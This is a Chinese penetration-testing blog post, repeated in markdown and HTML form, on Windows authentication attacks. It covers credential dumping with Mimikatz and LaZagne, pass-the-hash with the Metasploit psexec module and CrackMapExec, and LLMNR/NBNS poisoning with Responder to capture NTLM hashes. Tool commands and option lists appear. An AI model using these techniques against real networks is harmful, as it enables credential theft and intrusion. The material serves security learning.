Hash**\n\n在使用工具之前，有一点需要注意的是，我们知道早期Windows会存储用户密码对应的两种Hash值：`LM Hash:NT Hash`，直到Windows Vista和Window Server 2008之后，就只存储`NT Hash`了。为此，有些工具在给其提供Hash值参数时，需要使用`LM Hash:NT Hash`这样的格式，即使没有`LM Hash`，也要使用任意值进行填充以满足格式，通常的做法是填充32个0。但是也有的工具只需要给出`NT Hash`即可。Metasploit中的psexec和CrackMapExec就分别对应这两种情况。\n\n**Meatasploit Psexec**\n\n> Meatasploit中的`psexec`模块可以实现Hash传递攻击，攻击成功后会返回一个Meterpreter Session。\n\n攻击演示：\n\n- `use exploit/windows/smb/psexec`\n- 设置smbpass的格式是`LM:NTLM`，但在w2k8中，LM已禁用，所以`LM`处可以随意用32个字符填充满足模块所需的格式即可，比如使用32个0。\n\n![](windows认证攻击\\QQ截图20190406101732.png)\n\n**CrackMapExec**\n\n> 使用Hash值进行哈希传递攻击，让目标计算机执行指定的命令（-x \"cmd\"）。\n\nKali安装CrackMapExec：\n\n- `apt-get install crackmapexec`\n\n使用格式：\n\n```\ncrackmapexec  smb  <IP>  -u <Username>  -H <NT hash>  -x \"cmd\"\n```\n\n攻击演示：\n\n使用Hash值进行攻击，让目标计算机执行`msg adminitrator hacked`命令，执行成功后，目标计算机administrator用户的桌面会弹出一个消息框。\n\n![](windows认证攻击\\QQ截图20190405101817.png)\n\n### 0x02 毒化与中间人攻击\n\n在同一内网环境下，当一台Win机器向另一台Win机器以主机名（hostname）的形式请求相应的资源时,正常的通信大致流程如下：\n\n> 1、首先,Windows会先去查找自己hosts文件,无法解析主机名则继续往下。（C:\\Windows\\System32\\drivers\\etc\\hosts）\n>\n> 2、检查本地的dns缓存。（ipconfig /displaydns）\n>\n> 3、如果本地缓存不存在记录,则继续向本地网络中配置的dns服务器去请求。\n>\n> 4、最后,如果DNS服务器也解析失败,它就会被交给`LLMNR`和`NetBios-NS`协议去处理解析。\n\n**LLMNR**\n\n> `LLMNR`，（Link-Local Multicast Name Resolution），链路本地多播名称解析，是一个基于DNS协议数据包格式的名称解析协议，在DNS不能解析出结果时，最后会使用该协议（以及NBNS）。它存在Windows Vista、Windows Server 2008、Win7、Win8和Win10中。\n\n`LLMNR`与`NBNS`对比：\n\n> 1、NetBIOS基于广播，而LLMNR基于多播（224.0.0.251、UDP 5353）；\n>\n> 2、NetBIOS在WindowsNT以后的所有操作系统上均可用，而只有Windows Vista和更高版本才支持LLMNR；\n>\n> 3、LLMNR还支持IPv6，而NetBIOS不支持。\n\n**Responder**\n\nResponder是由LaurentGaffie发布的一款功能强大且简单易用的内网渗透工具，将NetBIOS名称服务（NBNS）、LLMNR和MDNS欺骗集于一身。[工具Github地址。](https://github.com/SpiderLabs/Responder)\n\nResponder内置了SMB认证服务器、MSSQL认证服务器、HTTP认证服务器、HTTPS认证服务器、LDAP认证服务器，DNS服务器、WPAD代理服务器，内建FTP、POP3、IMAP、SMTP服务器用于收集明文的凭据。\n\n当我们启动responder时，它会侦听网络中所有的`LLMNR`、`NBNS`名称解析请求数据包，并对请求进行类似于“你要找的机器就是我”的响应，从而将数据引到自己来，并且responder在监听数据包的同时也开启的诸如smb认证服务器等服务，以便在验证中窃取`NetNTLM Hash`。\n\n这意味着，当用户输入不存在、包含错误或者DNS中没有的主机名时，就会使用`LLMNR`、`NBNS`协议在网络中解析主机名，Responder就可以针对这些协议的请求进行响应，并使用内置的认证服务器与用户完成认证交互，然后窃取到`NTLMv2 Hash`。\n\n工具使用\n\n工具安装：`apt-get isntall responder`\n\nResponder会将所有抓取到的hash打印到标准输出接口上同时会以下面的格式存储到安装目录下的`logs/`文件夹下。\n\n- `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`\n\n参数：\n\n```\n简单启用：responder -I eth0 -v\n\nOptions:\n  --version          工具版本。\n  -h, --help         帮助信息。\n  -A, --analyze      分析模式。会抓取NBNS、LLMNR、浏览器请求，但不会对请求进行响应，可以用于分析目标网络情况。\n  \n  -I eth0, --interface=eth0      指定网络接口，可以指定'ALL'来使用所有接口。\n  -i 10.0.0.21, --ip=10.0.0.21   Local IP to use (only for OSX)\n  \n  -e 10.0.0.22, --externalip=10.0.0.22   以另一个外部机器的IP进行响应，意味着后面的数据会被引到该IP机器。\n  \n  -b, --basic           Return a Basic HTTP authentication. Default: NTLM\n  -r, --wredir          Enable answers for netbios wredir suffix queries.\n                        Answering to wredir will likely break stuff on the\n                        network. Default: False\n                        \n  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.\n                        Answering to domain suffixes will likely break stuff\n                        on the network. Default: False\n                        \n  -f, --fingerprint     This option allows you to fingerprint a host that\n                        issued an NBT-NS or LLMNR query.\n                        \n  -w, --wpad            Start the WPAD rogue proxy server. Default value is\n                        False\n                        \n  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY\n                        Upstream HTTP proxy used by the rogue WPAD Proxy for\n                        outgoing requests (format: host:port)\n                        \n  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file\n                        retrieval. This may cause a login prompt. Default:\n                        False\n                        \n  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)\n                        authentication for the proxy. WPAD doesn't need to be\n                        ON. This option is highly effective when combined with\n                        -r. Default: False\n                        \n  --lm                  Force LM hashing downgrade for Windows XP/2003 and\n                        earlier. Default: False\n                        \n  -v, --verbose         Increase verbosity.\n\n```\n\n工具配置文件路径：`/usr/share/responder/Responder.conf`\n\n修改配置文件只针对特定主机响应：\n\n![](windows认证攻击\\QQ截图20190408140244.png)\n\n工具演示：\n\n在网络中启用工具。\n\n![](windows认证攻击\\QQ截图20190408141317.png)\n\n抓取到Hash：\n\n![](windows认证攻击\\QQ截图20190408141627.png)\n\n使用Hashcat破解：\n\n**参考链接：**\n\nhttps://www.secpulse.com/archives/65503.html\n\nhttp://baijiahao.baidu.com/s?id=1599333064699003609&wfr=spider&for=pc\n\nhttps://www.jianshu.com/p/1b545a8b8b1e\n\nhttps://blog.csdn.net/vevenlcf/article/details/80887753","slug":"windows认证攻击","published":1,"updated":"2019-04-08T06:43:37.684Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83ne006d7or03l07qwyv","content":"<h3 id=\"0x00-窃取Windows凭证\"><a href=\"#0x00-窃取Windows凭证\" class=\"headerlink\" title=\"0x00 窃取Windows凭证\"></a>0x00 窃取Windows凭证</h3><p><strong>Mimikatz</strong></p>\n<p>我们在前面的文章已经提到过，当用户输入用户名密码登录时，用户名密码会被发送到<code>lsass.exe</code>进程中，然后<code>lsass.exe</code>会将明文密码计算为<code>NTLM Hash</code>，在用户登录期间一直保存在内存中。</p>\n<p>Mimikatz是法国人Gentil Kiwi编写的一款Windows平台下的神器，它具备很多功能，其中最亮的功能是直接从<code>lsass.exe</code>进程里获取<code>Windows</code>处于active状态账号的明文密码或<code>NT Hash</code>。在Windows &gt;= 8.1情况下，无法提取明文密码，但是可以提取到<code>NT Hash</code>。</p>\n<p><a href=\"https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-delegation\" target=\"_blank\" rel=\"noopener\">Mimikatz下载链接。</a></p>\n<a id=\"more\"></a>\n<p>工具演示：</p>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190407101243.png\" alt></p>\n<p><strong>LaZagne</strong></p>\n<p>既然说到提取密码，那么这里不得不说一款神器，它可以用于用户提取用户计算机上的明文密码。例如浏览器记住的密码、WIFI密码等。具体支持提取的密码有：</p>\n<p><img src=\"/2019/04/06/windows认证攻击/softwares.png\" alt></p>\n<p><a href=\"https://github.com/AlessandroZ/LaZagne\" target=\"_blank\" rel=\"noopener\">LaZagne下载地址。</a></p>\n<p>工具演示：</p>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190407105139.png\" alt></p>\n<h3 id=\"0x01-Pass-The-Hash\"><a href=\"#0x01-Pass-The-Hash\" class=\"headerlink\" title=\"0x01 Pass The Hash\"></a>0x01 Pass The Hash</h3><p>在之前的文章中，我们已经知道了Windows在进行Challenge/Response网络验证时，使用的用户密码对应的<code>NT Hash</code>加密<code>Server Challenge</code>得到Response（验证过程中第三个数据包），因此，我们只要知道用户的<code>NT Hash</code>，就可以直接使用Hash向服务器发起认证，并不需要知道明文密码。这种攻击就称之为哈希传递（Pass The Hash）。如果对此还有疑问，请跳转<a href=\"https://sakuxa.com/2019/04/03/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/\">这里</a>学习NTLM网络认证。</p>\n<p>常用实现Pass The Hash攻击的工具：</p>\n<ul>\n<li>Smbmap</li>\n<li>Smbexec</li>\n<li>Metasploit</li>\n<li>CrackMapExec</li>\n</ul>\n<p>接下来我们使用最后两个工具来模拟进行哈希传递攻击。</p>\n<p><strong>NTLM Hash</strong></p>\n<p>在使用工具之前，有一点需要注意的是，我们知道早期Windows会存储用户密码对应的两种Hash值：<code>LM Hash:NT Hash</code>，直到Windows Vista和Window Server 2008之后，就只存储<code>NT Hash</code>了。为此，有些工具在给其提供Hash值参数时，需要使用<code>LM Hash:NT Hash</code>这样的格式，即使没有<code>LM Hash</code>，也要使用任意值进行填充以满足格式，通常的做法是填充32个0。但是也有的工具只需要给出<code>NT Hash</code>即可。Metasploit中的psexec和CrackMapExec就分别对应这两种情况。</p>\n<p><strong>Meatasploit Psexec</strong></p>\n<blockquote>\n<p>Meatasploit中的<code>psexec</code>模块可以实现Hash传递攻击，攻击成功后会返回一个Meterpreter Session。</p>\n</blockquote>\n<p>攻击演示：</p>\n<ul>\n<li><code>use exploit/windows/smb/psexec</code></li>\n<li>设置smbpass的格式是<code>LM:NTLM</code>，但在w2k8中，LM已禁用，所以<code>LM</code>处可以随意用32个字符填充满足模块所需的格式即可，比如使用32个0。</li>\n</ul>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190406101732.png\" alt></p>\n<p><strong>CrackMapExec</strong></p>\n<blockquote>\n<p>使用Hash值进行哈希传递攻击，让目标计算机执行指定的命令（-x “cmd”）。</p>\n</blockquote>\n<p>Kali安装CrackMapExec：</p>\n<ul>\n<li><code>apt-get install crackmapexec</code></li>\n</ul>\n<p>使用格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crackmapexec  smb  &lt;IP&gt;  -u &lt;Username&gt;  -H &lt;NT hash&gt;  -x &quot;cmd&quot;</span><br></pre></td></tr></table></figure>\n<p>攻击演示：</p>\n<p>使用Hash值进行攻击，让目标计算机执行<code>msg adminitrator hacked</code>命令，执行成功后，目标计算机administrator用户的桌面会弹出一个消息框。</p>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190405101817.png\" alt></p>\n<h3 id=\"0x02-毒化与中间人攻击\"><a href=\"#0x02-毒化与中间人攻击\" class=\"headerlink\" title=\"0x02 毒化与中间人攻击\"></a>0x02 毒化与中间人攻击</h3><p>在同一内网环境下，当一台Win机器向另一台Win机器以主机名（hostname）的形式请求相应的资源时,正常的通信大致流程如下：</p>\n<blockquote>\n<p>1、首先,Windows会先去查找自己hosts文件,无法解析主机名则继续往下。（C:\\Windows\\System32\\drivers\\etc\\hosts）</p>\n<p>2、检查本地的dns缓存。（ipconfig /displaydns）</p>\n<p>3、如果本地缓存不存在记录,则继续向本地网络中配置的dns服务器去请求。</p>\n<p>4、最后,如果DNS服务器也解析失败,它就会被交给<code>LLMNR</code>和<code>NetBios-NS</code>协议去处理解析。</p>\n</blockquote>\n<p><strong>LLMNR</strong></p>\n<blockquote>\n<p><code>LLMNR</code>，（Link-Local Multicast Name Resolution），链路本地多播名称解析，是一个基于DNS协议数据包格式的名称解析协议，在DNS不能解析出结果时，最后会使用该协议（以及NBNS）。它存在Windows Vista、Windows Server 2008、Win7、Win8和Win10中。</p>\n</blockquote>\n<p><code>LLMNR</code>与<code>NBNS</code>对比：</p>\n<blockquote>\n<p>1、NetBIOS基于广播，而LLMNR基于多播（224.0.0.251、UDP 5353）；</p>\n<p>2、NetBIOS在WindowsNT以后的所有操作系统上均可用，而只有Windows Vista和更高版本才支持LLMNR；</p>\n<p>3、LLMNR还支持IPv6，而NetBIOS不支持。</p>\n</blockquote>\n<p><strong>Responder</strong></p>\n<p>Responder是由LaurentGaffie发布的一款功能强大且简单易用的内网渗透工具，将NetBIOS名称服务（NBNS）、LLMNR和MDNS欺骗集于一身。<a href=\"https://github.com/SpiderLabs/Responder\" target=\"_blank\" rel=\"noopener\">工具Github地址。</a></p>\n<p>Responder内置了SMB认证服务器、MSSQL认证服务器、HTTP认证服务器、HTTPS认证服务器、LDAP认证服务器，DNS服务器、WPAD代理服务器，内建FTP、POP3、IMAP、SMTP服务器用于收集明文的凭据。</p>\n<p>当我们启动responder时，它会侦听网络中所有的<code>LLMNR</code>、<code>NBNS</code>名称解析请求数据包，并对请求进行类似于“你要找的机器就是我”的响应，从而将数据引到自己来，并且responder在监听数据包的同时也开启的诸如smb认证服务器等服务，以便在验证中窃取<code>NetNTLM Hash</code>。</p>\n<p>这意味着，当用户输入不存在、包含错误或者DNS中没有的主机名时，就会使用<code>LLMNR</code>、<code>NBNS</code>协议在网络中解析主机名，Responder就可以针对这些协议的请求进行响应，并使用内置的认证服务器与用户完成认证交互，然后窃取到<code>NTLMv2 Hash</code>。</p>\n<p>工具使用</p>\n<p>工具安装：<code>apt-get isntall responder</code></p>\n<p>Responder会将所有抓取到的hash打印到标准输出接口上同时会以下面的格式存储到安装目录下的<code>logs/</code>文件夹下。</p>\n<ul>\n<li><code>(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt</code></li>\n</ul>\n<p>参数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">简单启用：responder -I eth0 -v</span><br><span class=\"line\"></span><br><span class=\"line\">Options:</span><br><span class=\"line\">  --version          工具版本。</span><br><span class=\"line\">  -h, --help         帮助信息。</span><br><span class=\"line\">  -A, --analyze      分析模式。会抓取NBNS、LLMNR、浏览器请求，但不会对请求进行响应，可以用于分析目标网络情况。</span><br><span class=\"line\">  </span><br><span class=\"line\">  -I eth0, --interface=eth0      指定网络接口，可以指定&apos;ALL&apos;来使用所有接口。</span><br><span class=\"line\">  -i 10.0.0.21, --ip=10.0.0.21   Local IP to use (only for OSX)</span><br><span class=\"line\">  </span><br><span class=\"line\">  -e 10.0.0.22, --externalip=10.0.0.22   以另一个外部机器的IP进行响应，意味着后面的数据会被引到该IP机器。</span><br><span class=\"line\">  </span><br><span class=\"line\">  -b, --basic           Return a Basic HTTP authentication. Default: NTLM</span><br><span class=\"line\">  -r, --wredir          Enable answers for netbios wredir suffix queries.</span><br><span class=\"line\">                        Answering to wredir will likely break stuff on the</span><br><span class=\"line\">                        network. Default: False</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.</span><br><span class=\"line\">                        Answering to domain suffixes will likely break stuff</span><br><span class=\"line\">                        on the network. Default: False</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -f, --fingerprint     This option allows you to fingerprint a host that</span><br><span class=\"line\">                        issued an NBT-NS or LLMNR query.</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -w, --wpad            Start the WPAD rogue proxy server. Default value is</span><br><span class=\"line\">                        False</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY</span><br><span class=\"line\">                        Upstream HTTP proxy used by the rogue WPAD Proxy for</span><br><span class=\"line\">                        outgoing requests (format: host:port)</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file</span><br><span class=\"line\">                        retrieval. This may cause a login prompt. Default:</span><br><span class=\"line\">                        False</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)</span><br><span class=\"line\">                        authentication for the proxy. WPAD doesn&apos;t need to be</span><br><span class=\"line\">                        ON. This option is highly effective when combined with</span><br><span class=\"line\">                        -r. Default: False</span><br><span class=\"line\">                        </span><br><span class=\"line\">  --lm                  Force LM hashing downgrade for Windows XP/2003 and</span><br><span class=\"line\">                        earlier. Default: False</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -v, --verbose         Increase verbosity.</span><br></pre></td></tr></table></figure>\n<p>工具配置文件路径：<code>/usr/share/responder/Responder.conf</code></p>\n<p>修改配置文件只针对特定主机响应：</p>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190408140244.png\" alt></p>\n<p>工具演示：</p>\n<p>在网络中启用工具。</p>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190408141317.png\" alt></p>\n<p>抓取到Hash：</p>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190408141627.png\" alt></p>\n<p>使用Hashcat破解：</p>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://www.secpulse.com/archives/65503.html\" target=\"_blank\" rel=\"noopener\">https://www.secpulse.com/archives/65503.html</a></p>\n<p><a href=\"http://baijiahao.baidu.com/s?id=1599333064699003609&amp;wfr=spider&amp;for=pc\" target=\"_blank\" rel=\"noopener\">http://baijiahao.baidu.com/s?id=1599333064699003609&amp;wfr=spider&amp;for=pc</a></p>\n<p><a href=\"https://www.jianshu.com/p/1b545a8b8b1e\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/1b545a8b8b1e</a></p>\n<p><a href=\"https://blog.csdn.net/vevenlcf/article/details/80887753\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/vevenlcf/article/details/80887753</a></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"0x00-窃取Windows凭证\"><a href=\"#0x00-窃取Windows凭证\" class=\"headerlink\" title=\"0x00 窃取Windows凭证\"></a>0x00 窃取Windows凭证</h3><p><strong>Mimikatz</strong></p>\n<p>我们在前面的文章已经提到过，当用户输入用户名密码登录时，用户名密码会被发送到<code>lsass.exe</code>进程中，然后<code>lsass.exe</code>会将明文密码计算为<code>NTLM Hash</code>，在用户登录期间一直保存在内存中。</p>\n<p>Mimikatz是法国人Gentil Kiwi编写的一款Windows平台下的神器，它具备很多功能，其中最亮的功能是直接从<code>lsass.exe</code>进程里获取<code>Windows</code>处于active状态账号的明文密码或<code>NT Hash</code>。在Windows &gt;= 8.1情况下，无法提取明文密码，但是可以提取到<code>NT Hash</code>。</p>\n<p><a href=\"https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-delegation\" target=\"_blank\" rel=\"noopener\">Mimikatz下载链接。</a></p>","more":"<p>工具演示：</p>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190407101243.png\" alt></p>\n<p><strong>LaZagne</strong></p>\n<p>既然说到提取密码，那么这里不得不说一款神器，它可以用于用户提取用户计算机上的明文密码。例如浏览器记住的密码、WIFI密码等。具体支持提取的密码有：</p>\n<p><img src=\"/2019/04/06/windows认证攻击/softwares.png\" alt></p>\n<p><a href=\"https://github.com/AlessandroZ/LaZagne\" target=\"_blank\" rel=\"noopener\">LaZagne下载地址。</a></p>\n<p>工具演示：</p>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190407105139.png\" alt></p>\n<h3 id=\"0x01-Pass-The-Hash\"><a href=\"#0x01-Pass-The-Hash\" class=\"headerlink\" title=\"0x01 Pass The Hash\"></a>0x01 Pass The Hash</h3><p>在之前的文章中，我们已经知道了Windows在进行Challenge/Response网络验证时，使用的用户密码对应的<code>NT Hash</code>加密<code>Server Challenge</code>得到Response（验证过程中第三个数据包），因此，我们只要知道用户的<code>NT Hash</code>，就可以直接使用Hash向服务器发起认证，并不需要知道明文密码。这种攻击就称之为哈希传递（Pass The Hash）。如果对此还有疑问，请跳转<a href=\"https://sakuxa.com/2019/04/03/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/\">这里</a>学习NTLM网络认证。</p>\n<p>常用实现Pass The Hash攻击的工具：</p>\n<ul>\n<li>Smbmap</li>\n<li>Smbexec</li>\n<li>Metasploit</li>\n<li>CrackMapExec</li>\n</ul>\n<p>接下来我们使用最后两个工具来模拟进行哈希传递攻击。</p>\n<p><strong>NTLM Hash</strong></p>\n<p>在使用工具之前，有一点需要注意的是，我们知道早期Windows会存储用户密码对应的两种Hash值：<code>LM Hash:NT Hash</code>，直到Windows Vista和Window Server 2008之后，就只存储<code>NT Hash</code>了。为此，有些工具在给其提供Hash值参数时，需要使用<code>LM Hash:NT Hash</code>这样的格式，即使没有<code>LM Hash</code>，也要使用任意值进行填充以满足格式，通常的做法是填充32个0。但是也有的工具只需要给出<code>NT Hash</code>即可。Metasploit中的psexec和CrackMapExec就分别对应这两种情况。</p>\n<p><strong>Meatasploit Psexec</strong></p>\n<blockquote>\n<p>Meatasploit中的<code>psexec</code>模块可以实现Hash传递攻击，攻击成功后会返回一个Meterpreter Session。</p>\n</blockquote>\n<p>攻击演示：</p>\n<ul>\n<li><code>use exploit/windows/smb/psexec</code></li>\n<li>设置smbpass的格式是<code>LM:NTLM</code>，但在w2k8中，LM已禁用，所以<code>LM</code>处可以随意用32个字符填充满足模块所需的格式即可，比如使用32个0。</li>\n</ul>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190406101732.png\" alt></p>\n<p><strong>CrackMapExec</strong></p>\n<blockquote>\n<p>使用Hash值进行哈希传递攻击，让目标计算机执行指定的命令（-x “cmd”）。</p>\n</blockquote>\n<p>Kali安装CrackMapExec：</p>\n<ul>\n<li><code>apt-get install crackmapexec</code></li>\n</ul>\n<p>使用格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crackmapexec  smb  &lt;IP&gt;  -u &lt;Username&gt;  -H &lt;NT hash&gt;  -x &quot;cmd&quot;</span><br></pre></td></tr></table></figure>\n<p>攻击演示：</p>\n<p>使用Hash值进行攻击，让目标计算机执行<code>msg adminitrator hacked</code>命令，执行成功后，目标计算机administrator用户的桌面会弹出一个消息框。</p>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190405101817.png\" alt></p>\n<h3 id=\"0x02-毒化与中间人攻击\"><a href=\"#0x02-毒化与中间人攻击\" class=\"headerlink\" title=\"0x02 毒化与中间人攻击\"></a>0x02 毒化与中间人攻击</h3><p>在同一内网环境下，当一台Win机器向另一台Win机器以主机名（hostname）的形式请求相应的资源时,正常的通信大致流程如下：</p>\n<blockquote>\n<p>1、首先,Windows会先去查找自己hosts文件,无法解析主机名则继续往下。（C:\\Windows\\System32\\drivers\\etc\\hosts）</p>\n<p>2、检查本地的dns缓存。（ipconfig /displaydns）</p>\n<p>3、如果本地缓存不存在记录,则继续向本地网络中配置的dns服务器去请求。</p>\n<p>4、最后,如果DNS服务器也解析失败,它就会被交给<code>LLMNR</code>和<code>NetBios-NS</code>协议去处理解析。</p>\n</blockquote>\n<p><strong>LLMNR</strong></p>\n<blockquote>\n<p><code>LLMNR</code>，（Link-Local Multicast Name Resolution），链路本地多播名称解析，是一个基于DNS协议数据包格式的名称解析协议，在DNS不能解析出结果时，最后会使用该协议（以及NBNS）。它存在Windows Vista、Windows Server 2008、Win7、Win8和Win10中。</p>\n</blockquote>\n<p><code>LLMNR</code>与<code>NBNS</code>对比：</p>\n<blockquote>\n<p>1、NetBIOS基于广播，而LLMNR基于多播（224.0.0.251、UDP 5353）；</p>\n<p>2、NetBIOS在WindowsNT以后的所有操作系统上均可用，而只有Windows Vista和更高版本才支持LLMNR；</p>\n<p>3、LLMNR还支持IPv6，而NetBIOS不支持。</p>\n</blockquote>\n<p><strong>Responder</strong></p>\n<p>Responder是由LaurentGaffie发布的一款功能强大且简单易用的内网渗透工具，将NetBIOS名称服务（NBNS）、LLMNR和MDNS欺骗集于一身。<a href=\"https://github.com/SpiderLabs/Responder\" target=\"_blank\" rel=\"noopener\">工具Github地址。</a></p>\n<p>Responder内置了SMB认证服务器、MSSQL认证服务器、HTTP认证服务器、HTTPS认证服务器、LDAP认证服务器，DNS服务器、WPAD代理服务器，内建FTP、POP3、IMAP、SMTP服务器用于收集明文的凭据。</p>\n<p>当我们启动responder时，它会侦听网络中所有的<code>LLMNR</code>、<code>NBNS</code>名称解析请求数据包，并对请求进行类似于“你要找的机器就是我”的响应，从而将数据引到自己来，并且responder在监听数据包的同时也开启的诸如smb认证服务器等服务，以便在验证中窃取<code>NetNTLM Hash</code>。</p>\n<p>这意味着，当用户输入不存在、包含错误或者DNS中没有的主机名时，就会使用<code>LLMNR</code>、<code>NBNS</code>协议在网络中解析主机名，Responder就可以针对这些协议的请求进行响应，并使用内置的认证服务器与用户完成认证交互，然后窃取到<code>NTLMv2 Hash</code>。</p>\n<p>工具使用</p>\n<p>工具安装：<code>apt-get isntall responder</code></p>\n<p>Responder会将所有抓取到的hash打印到标准输出接口上同时会以下面的格式存储到安装目录下的<code>logs/</code>文件夹下。</p>\n<ul>\n<li><code>(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt</code></li>\n</ul>\n<p>参数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">简单启用：responder -I eth0 -v</span><br><span class=\"line\"></span><br><span class=\"line\">Options:</span><br><span class=\"line\">  --version          工具版本。</span><br><span class=\"line\">  -h, --help         帮助信息。</span><br><span class=\"line\">  -A, --analyze      分析模式。会抓取NBNS、LLMNR、浏览器请求，但不会对请求进行响应，可以用于分析目标网络情况。</span><br><span class=\"line\">  </span><br><span class=\"line\">  -I eth0, --interface=eth0      指定网络接口，可以指定&apos;ALL&apos;来使用所有接口。</span><br><span class=\"line\">  -i 10.0.0.21, --ip=10.0.0.21   Local IP to use (only for OSX)</span><br><span class=\"line\">  </span><br><span class=\"line\">  -e 10.0.0.22, --externalip=10.0.0.22   以另一个外部机器的IP进行响应，意味着后面的数据会被引到该IP机器。</span><br><span class=\"line\">  </span><br><span class=\"line\">  -b, --basic           Return a Basic HTTP authentication. Default: NTLM</span><br><span class=\"line\">  -r, --wredir          Enable answers for netbios wredir suffix queries.</span><br><span class=\"line\">                        Answering to wredir will likely break stuff on the</span><br><span class=\"line\">                        network. Default: False</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.</span><br><span class=\"line\">                        Answering to domain suffixes will likely break stuff</span><br><span class=\"line\">                        on the network. Default: False</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -f, --fingerprint     This option allows you to fingerprint a host that</span><br><span class=\"line\">                        issued an NBT-NS or LLMNR query.</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -w, --wpad            Start the WPAD rogue proxy server. Default value is</span><br><span class=\"line\">                        False</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY</span><br><span class=\"line\">                        Upstream HTTP proxy used by the rogue WPAD Proxy for</span><br><span class=\"line\">                        outgoing requests (format: host:port)</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat 